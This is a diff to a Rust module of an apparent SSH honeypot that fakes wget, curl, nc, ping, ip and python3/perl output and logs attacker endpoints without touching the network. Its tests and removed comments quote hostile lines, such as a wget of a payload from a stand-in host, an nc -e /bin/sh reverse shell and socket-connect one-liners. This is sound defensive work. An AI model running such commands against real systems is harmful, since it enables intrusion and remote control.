@@ -1,21 +1,6 @@
-//! Network commands: `wget`, `curl`, `ping`, `netstat`, `ss`, `ip`, `nc`, and
-//! the `python3`/`perl` invocation stubs.
-//!
-//! None of these touch the real network. They render believable output and
-//! record every remote endpoint an attacker named as a [`Capture`] for forensic
-//! logging; `wget`/`curl` additionally drop a placeholder file into the
-//! in-memory VFS.
-//!
-//! The interpreters live here because that is what they are used for: a
-//! `python3 -c` one-liner in an SSH session is a reverse shell far more often
-//! than it is anything else, and it is captured the same way a `wget` URL is.
-//! Nothing is ever interpreted — see [`python3`].
-
 use super::CommandResult;
 use crate::shell::{Capture, Screen, Shell};
 
-/// A deterministic but plausible "resolved" address for any hostname, so repeat
-/// lookups in a session stay consistent without performing real DNS.
 fn fake_resolve(host: &str) -> String {
     if host == "localhost" {
         return "127.0.0.1".to_string();
@@ -27,7 +12,7 @@ fn fake_resolve(host: &str) -> String {
     for b in host.bytes() {
         h = (h ^ b as u32).wrapping_mul(16777619);
     }
-    // Map into a public-looking range, avoiding .0/.255 octets.
+
     let a = 13 + (h % 200);
     let b = (h >> 8) % 254 + 1;
     let c = (h >> 16) % 254 + 1;
@@ -35,7 +20,6 @@ fn fake_resolve(host: &str) -> String {
     format!("{a}.{b}.{c}.{d}")
 }
 
-/// Split a URL into `(host, last_path_component)`.
 fn url_parts(url: &str) -> (String, String) {
     let without_scheme = url.split_once("://").map(|(_, rest)| rest).unwrap_or(url);
     let (authority, path) = match without_scheme.split_once('/') {
@@ -58,16 +42,10 @@ fn url_parts(url: &str) -> (String, String) {
     (host.to_string(), base.to_string())
 }
 
-/// The size a fetch of `host` reports and writes. Stable per host so repeated
-/// downloads in one session stay consistent with each other.
 fn fake_size(host: &str) -> u64 {
     1024 + (host.len() as u64 * 37 % 8192)
 }
 
-/// Body for a "downloaded" artefact. A block of identical bytes is an obvious
-/// tell to anyone who looks at what they just fetched, so the filler is
-/// deterministic pseudo-random noise — what a compressed or binary payload
-/// looks like from the outside.
 fn placeholder_bytes(url: &str, size: u64) -> Vec<u8> {
     let mut state = url.bytes().fold(0xcbf2_9ce4_8422_2325_u64, |acc, b| {
         (acc ^ b as u64).wrapping_mul(0x100_0000_01b3)
@@ -82,11 +60,6 @@ fn placeholder_bytes(url: &str, size: u64) -> Vec<u8> {
         .collect()
 }
 
-/// Create a placeholder file for a "downloaded" artefact in the cwd (or at an
-/// explicit path) so a follow-up `ls`/`cat` is consistent with the transfer.
-/// Returns the path written and the number of bytes that actually landed —
-/// the VFS content cap can refuse the write, and the transfer must not claim
-/// bytes the attacker cannot then see in `ls -l`.
 fn drop_file(shell: &mut Shell, dest: &str, contents: Vec<u8>) -> (String, u64) {
     let path = if dest == "-" {
         return ("-".to_string(), 0);
@@ -110,7 +83,6 @@ fn drop_file(shell: &mut Shell, dest: &str, contents: Vec<u8>) -> (String, u64) 
     (path, 0)
 }
 
-/// `wget [OPTION]... [URL]...`
 pub fn wget(shell: &mut Shell, args: &[String]) -> CommandResult {
     let mut quiet = false;
     let mut output: Option<String> = None;
@@ -130,7 +102,7 @@ pub fn wget(shell: &mut Shell, args: &[String]) -> CommandResult {
             s if s.starts_with("--output-document=") => {
                 output = Some(s["--output-document=".len()..].to_string())
             }
-            s if s.starts_with('-') => {} // -c, -L, --no-check-certificate, ...
+            s if s.starts_with('-') => {}
             other => urls.push(other.to_string()),
         }
     }
@@ -186,7 +158,6 @@ pub fn wget(shell: &mut Shell, args: &[String]) -> CommandResult {
     CommandResult::ok(out)
 }
 
-/// `curl [OPTION]... [URL]...`
 pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
     let mut output: Option<String> = None;
     let mut remote_name = false;
@@ -205,7 +176,7 @@ pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
             | "-e" | "--referer" | "-b" | "--cookie" | "-u" | "--user" => {
                 iter.next();
             }
-            s if s.starts_with('-') => {} // -L, -k, -v, -f, ...
+            s if s.starts_with('-') => {}
             other => urls.push(other.to_string()),
         }
     }
@@ -249,9 +220,6 @@ pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
             out.push_str(&format!("Content-Length: {size}\r\n"));
             out.push_str("Connection: keep-alive\r\n\r\n");
         } else if !silent && dest != "-" {
-            // Real curl always renders this table when the body goes to a file.
-            // A small transfer completes instantly; curl then reports a rate in
-            // the hundreds of KB/s rather than a measured one.
             let rate = format!("{}k", 300 + size % 500);
             out.push_str(
                 "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
@@ -267,7 +235,6 @@ pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
     CommandResult::ok(out)
 }
 
-/// `ping [-c COUNT] HOST`
 pub fn ping(_shell: &Shell, args: &[String]) -> CommandResult {
     let mut count: u32 = 4;
     let mut host: Option<&str> = None;
@@ -317,7 +284,6 @@ pub fn ping(_shell: &Shell, args: &[String]) -> CommandResult {
     CommandResult::ok(out)
 }
 
-/// `netstat [OPTION]...`
 pub fn netstat(_shell: &Shell, args: &[String]) -> CommandResult {
     let flags: String = args
         .iter()
@@ -365,7 +331,6 @@ pub fn netstat(_shell: &Shell, args: &[String]) -> CommandResult {
     CommandResult::ok(out)
 }
 
-/// `ss [OPTION]...`
 pub fn ss(_shell: &Shell, args: &[String]) -> CommandResult {
     let flags: String = args
         .iter()
@@ -398,7 +363,6 @@ pub fn ss(_shell: &Shell, args: &[String]) -> CommandResult {
     CommandResult::ok(out)
 }
 
-/// `ip [OPTION] OBJECT { COMMAND }`
 pub fn ip(shell: &Shell, args: &[String]) -> CommandResult {
     let object = args
         .iter()
@@ -421,11 +385,6 @@ pub fn ip(shell: &Shell, args: &[String]) -> CommandResult {
     }
 }
 
-/// The EUI-64 link-local address the kernel derives from an interface MAC.
-///
-/// A `fe80::` address that does not match the `link/ether` line two rows above
-/// it is a tell for anyone who knows how SLAAC works, so it is computed rather
-/// than written down.
 fn link_local(mac: &str) -> String {
     let o: Vec<u8> = mac
         .split(':')
@@ -434,7 +393,7 @@ fn link_local(mac: &str) -> String {
     if o.len() != 6 {
         return "fe80::1".to_string();
     }
-    // Flip the universal/local bit and insert ff:fe in the middle, per RFC 4291.
+
     let first = o[0] ^ 0x02;
     format!(
         "fe80::{:x}{:02x}:{:02x}ff:fe{:02x}:{:02x}{:02x}",
@@ -483,12 +442,10 @@ fn ip_route(p: &crate::persona::Persona) -> String {
     )
 }
 
-/// Truncate a string to `max` chars for fixed-width columns.
 fn trunc(s: &str, max: usize) -> String {
     s.chars().take(max).collect()
 }
 
-/// Human-readable byte size in wget's style (K/M/G with one decimal).
 fn human(bytes: u64) -> String {
     const UNITS: [&str; 4] = ["", "K", "M", "G"];
     if bytes < 1024 {
@@ -503,15 +460,6 @@ fn human(bytes: u64) -> String {
     format!("{value:.1}{}", UNITS[unit])
 }
 
-/// `nc [-lvnz] [-w SECS] [-e CMD] HOST PORT...`
-///
-/// No socket is ever opened — the same rule `wget` and `curl` follow. The
-/// endpoint is captured, because `nc 1.2.3.4 4444 -e /bin/sh` names the C2 the
-/// operator most wants out of a session, and then the connect fails.
-///
-/// "Connection refused" is the honest answer: it is by far the most common real
-/// outcome (the attacker's listener is usually already gone), it is instant, and
-/// it keeps them trying other tools rather than believing they have a shell.
 pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
     let mut listen = false;
     let mut port_flag = false;
@@ -523,8 +471,6 @@ pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
 
     while let Some(arg) = iter.next() {
         match arg.as_str() {
-            // Flags that take a value, consumed so the value is not read as a
-            // host or a port.
             "-w" | "-e" | "-c" | "-s" | "-X" | "-x" | "-i" | "-q" | "-O" | "-P" | "-T" => {
                 iter.next();
             }
@@ -539,8 +485,7 @@ pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
                         _ => {}
                     }
                 }
-                // A bundled value-taking flag consumes the next argument too,
-                // as in `nc -lvp 4444` or `nc -w 3 host port`.
+
                 if s[1..].ends_with(['w', 'e', 'c', 's', 'i', 'p', 'q']) {
                     if let Some(v) = iter.next() {
                         if s[1..].ends_with('p') {
@@ -554,18 +499,10 @@ pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
     }
 
     if listen {
-        // Debian 12 ships netcat-openbsd, which really does refuse this — and
-        // `nc -lvp PORT` is the syntax attackers type, carried over from
-        // netcat-traditional. Reproducing the refusal is both faithful and the
-        // reason listen mode needs no further emulation here.
         if port_flag {
             return CommandResult::err("nc: cannot use -p and -l\n", 1);
         }
-        // A real listener blocks in accept(2) until a client connects or it is
-        // interrupted; since no socket is ever opened here, holding the
-        // terminal until Ctrl-C is the whole of what is left to emulate. Only
-        // on an interactive PTY — the same gate `top` uses — because a pipe or
-        // a one-shot `exec` has no terminal to hold.
+
         if shell.interactive && shell.stdout_is_tty {
             shell.screen = Some(Screen::Listen);
         }
@@ -592,8 +529,7 @@ pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
             url: format!("{proto}://{host}:{port}"),
             dest: "-".into(),
         });
-        // netcat-openbsd is silent on a failed connect unless asked; only
-        // `-v`/`-z` print the diagnostic.
+
         if verbose || scan {
             errs.push_str(&format!(
                 "nc: connect to {host} port {port} ({proto}) failed: Connection refused\n"
@@ -603,25 +539,10 @@ pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
     CommandResult::err(errs, 1)
 }
 
-/// `python3` — see the note below; `perl` is [`perl`].
-///
-/// No interpreter is emulated, and none should be: running attacker code is the
-/// one thing this box exists not to do. What matters is the *invocation* — the
-/// `-c` payload is the intelligence, and the `command` event already records
-/// the whole line verbatim, including the one-liner. Before this existed the
-/// same line came back `command not found`, which both lost the interaction and
-/// told a scanner the box has no Python while `dpkg -l` lists python3 as
-/// installed. That contradiction was the real cost.
-///
-/// The one-liner attackers reach for is a reverse shell, and the outcome a real
-/// box gives it most of the time is a connect that fails — their listener is
-/// usually already gone. So a payload that tries to reach the network gets the
-/// traceback that failure produces, and anything else exits quietly.
 pub fn python3(shell: &mut Shell, args: &[String]) -> CommandResult {
     interpreter(shell, "python3", args)
 }
 
-/// `perl` — see [`interpreter`].
 pub fn perl(shell: &mut Shell, args: &[String]) -> CommandResult {
     interpreter(shell, "perl", args)
 }
@@ -645,8 +566,7 @@ fn interpreter(shell: &mut Shell, name: &str, args: &[String]) -> CommandResult 
                 };
                 return run_inline(shell, name, code);
             }
-            // Flags that take a value; consumed so the value is not mistaken
-            // for a script path.
+
             "-m" | "-W" | "-X" | "-I" if !perl => {
                 iter.next();
                 return CommandResult::empty();
@@ -656,13 +576,10 @@ fn interpreter(shell: &mut Shell, name: &str, args: &[String]) -> CommandResult 
         }
     }
 
-    // No script and no `-c`: the interpreter reads its program from stdin,
-    // which is how `curl … | python3` and `python3 < payload` arrive.
     if shell.stdin.is_some() {
         return CommandResult::empty();
     }
-    // With no stdin either, python prints its banner and exits at EOF. Perl
-    // waits for input and then exits silently.
+
     if perl {
         CommandResult::empty()
     } else {
@@ -673,18 +590,11 @@ fn interpreter(shell: &mut Shell, name: &str, args: &[String]) -> CommandResult 
     }
 }
 
-/// Run a `-c`/`-e` one-liner. Nothing is executed; the payload is already in the
-/// `command` event, so all this decides is what the attacker sees back.
 fn run_inline(shell: &mut Shell, name: &str, code: &str) -> CommandResult {
     let Some((host, port)) = inline_endpoint(code) else {
-        // A non-network one-liner: most of these really do exit 0 with no
-        // output, and guessing at output for code that was never run would be
-        // a fabrication, not an emulation.
         return CommandResult::empty();
     };
 
-    // The endpoint is worth as much as a `wget` URL, and lands in the same
-    // event so one query finds every remote host a session named.
     shell.captures.push(Capture::Download {
         tool: name.to_string(),
         url: format!("tcp://{host}:{port}"),
@@ -702,19 +612,9 @@ fn run_inline(shell: &mut Shell, name: &str, code: &str) -> CommandResult {
     )
 }
 
-/// Run a script operand. The file has to exist in the VFS — a dropper that
-/// `wget`s a payload and then runs it should see it run, and one that names a
-/// path that was never written should see the real error.
 fn run_script(shell: &mut Shell, name: &str, script: &str) -> CommandResult {
     match shell.vfs.resolve(shell.cwd, script) {
-        Some(id) if !shell.vfs.node(id).meta.is_dir() => {
-            // ponytail: the body is not interpreted, so a script that would
-            // have printed something prints nothing. `sh` runs its operands
-            // line by line because those lines are shell commands this box
-            // already emulates; there is no equivalent for Python. Upgrade only
-            // if captured payloads show scripts whose output attackers check.
-            CommandResult::empty()
-        }
+        Some(id) if !shell.vfs.node(id).meta.is_dir() => CommandResult::empty(),
         Some(_) if name == "perl" => CommandResult::err(
             format!("Can't open perl script \"{script}\": Is a directory\n"),
             2,
@@ -737,7 +637,6 @@ fn run_script(shell: &mut Shell, name: &str, script: &str) -> CommandResult {
     }
 }
 
-/// Python reports the absolute path it tried to open, not the operand.
 fn abs_operand(shell: &Shell, script: &str) -> String {
     if script.starts_with('/') {
         return script.to_string();
@@ -746,14 +645,6 @@ fn abs_operand(shell: &Shell, script: &str) -> String {
     format!("{}/{script}", cwd.trim_end_matches('/'))
 }
 
-/// The host and port a one-liner tries to reach, if it looks like it does.
-///
-/// Deliberately shallow: a quoted host-shaped string plus the integer literal
-/// nearest to it. Python writes the pair one way round
-/// (`s.connect(("1.2.3.4",4444))`) and Perl the other
-/// (`sockaddr_in(4444,inet_aton("1.2.3.4"))`), so "nearest" is what covers both
-/// without parsing either language. Missing an exotic payload costs a
-/// traceback, not a capture — the whole command line is logged regardless.
 fn inline_endpoint(code: &str) -> Option<(String, u16)> {
     if !code.contains("socket") && !code.contains("connect") && !code.contains("Socket") {
         return None;
@@ -772,14 +663,13 @@ fn inline_endpoint(code: &str) -> Option<(String, u16)> {
             break;
         };
         let host: String = chars[i + 1..i + 1 + len].iter().collect();
-        // A host is an address or a name, never empty and never a sentence.
+
         let host_shaped = !host.is_empty()
             && host.len() <= 253
             && host
                 .chars()
                 .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':');
         if host_shaped {
-            // The port literal closest to the host on either side.
             let (start, end) = (i, i + len + 1);
             if let Some((_, port)) = ports
                 .iter()
@@ -801,9 +691,6 @@ fn inline_endpoint(code: &str) -> Option<(String, u16)> {
     None
 }
 
-/// Every integer literal in `code` that could be a port, with where it starts.
-/// Dotted-quad octets are excluded by requiring the run not to sit between two
-/// dots, so `1.2.3.4` never contributes a "port".
 fn port_literals(chars: &[char]) -> Vec<(usize, u16)> {
     let mut out = Vec::new();
     let mut i = 0;
@@ -829,7 +716,6 @@ fn port_literals(chars: &[char]) -> Vec<(usize, u16)> {
     out
 }
 
-/// The `--version` line each interpreter prints.
 fn interpreter_version(name: &str) -> String {
     if name == "perl" {
         return "\nThis is perl 5, version 36, subversion 0 (v5.36.0) built for \
@@ -845,7 +731,6 @@ fn interpreter_version(name: &str) -> String {
     format!("{}\n", python_version())
 }
 
-/// The banner the interactive interpreter prints before its first prompt.
 fn interpreter_banner(_name: &str) -> String {
     format!(
         "{} (main, Mar 13 2023, 09:44:40) [GCC 12.2.0] on linux",
@@ -853,8 +738,6 @@ fn interpreter_banner(_name: &str) -> String {
     )
 }
 
-/// Kept in one place so `python3 --version`, the REPL banner and the
-/// `python3` entry in the package database cannot drift apart.
 fn python_version() -> &'static str {
     "Python 3.11.2"
 }
@@ -887,8 +770,7 @@ mod tests {
         let out = run(&mut shell, "wget http://evil.example/payload.sh");
         assert!(out.contains("200 OK"));
         assert!(out.contains("saved"));
-        // A structured download capture is recorded (check before the next
-        // command, which would clear it).
+
         assert_eq!(shell.captures.len(), 1);
         match &shell.captures[0] {
             Capture::Download { tool, url, .. } => {
@@ -897,7 +779,7 @@ mod tests {
             }
             other => panic!("expected a Download capture, got {other:?}"),
         }
-        // File materialises in cwd.
+
         assert!(run(&mut shell, "ls").contains("payload.sh"));
     }
 
@@ -909,8 +791,6 @@ mod tests {
         assert!(run(&mut shell, "ls").contains("mal.bin"));
     }
 
-    /// The transfer's reported size has to match the file it leaves behind:
-    /// "saved [1394/1394]" next to a 0-byte file is a one-command tell.
     #[test]
     fn downloaded_file_matches_the_reported_size() {
         for (tool, cmd, name) in [
@@ -971,8 +851,7 @@ mod tests {
             "{}",
             result.stderr
         );
-        // The endpoint is worth as much as a wget URL and lands in the same
-        // capture channel, so one query finds every remote host a session named.
+
         assert!(shell.captures.iter().any(|c| matches!(
             c,
             Capture::Download { tool, url, .. }
@@ -983,9 +862,7 @@ mod tests {
     #[test]
     fn nc_listen_matches_what_debian_actually_does() {
         let mut shell = Shell::new("root", "debian");
-        // Debian 12 ships netcat-openbsd, which really does refuse `-p` with
-        // `-l` — and `nc -lvp PORT` is the syntax attackers carry over from
-        // netcat-traditional.
+
         let result = shell.execute("nc -lvp 4444");
         assert_eq!(result.status, 1);
         assert!(result.stderr.contains("cannot use -p and -l"));
@@ -1001,9 +878,6 @@ mod tests {
             "nc -l should hold the screen on a terminal"
         );
 
-        // A pipe, a redirect, and a one-shot `exec` are not a terminal: a
-        // real listener backgrounded with no controlling tty does not hold
-        // one either.
         run(&mut shell, "nc -l 4444 | cat");
         assert!(shell.screen.is_none(), "a pipe should not hold the screen");
         run(&mut shell, "nc -l 4444 > /tmp/out");
@@ -1039,20 +913,15 @@ mod tests {
     #[test]
     fn python3_runs_nothing_and_says_so_consistently() {
         let mut shell = Shell::new("root", "debian");
-        // A non-network one-liner exits quietly: inventing output for code that
-        // was never run would be a fabrication, not an emulation.
+
         let quiet = shell.execute("python3 -c 'print(1+1)'");
         assert_eq!(quiet.status, 0);
         assert_eq!(quiet.stdout, "");
 
-        // The version must match what `dpkg -l` reports, or one command
-        // contradicts the other.
         let version = shell.execute("python3 --version");
         assert_eq!(version.stdout.trim(), "Python 3.11.2");
         assert!(shell.execute("dpkg -l").stdout.contains("3.11.2"));
 
-        // A script that was never dropped gets the real error, with the
-        // absolute path python reports rather than the operand.
         let missing = shell.execute("python3 /tmp/nope.py");
         assert_eq!(missing.status, 2);
         assert!(
@@ -1061,7 +930,6 @@ mod tests {
             missing.stderr
         );
 
-        // Debian 12 has no /usr/bin/python, only python3.
         assert_eq!(shell.execute("python -c 'pass'").status, 127);
     }
 
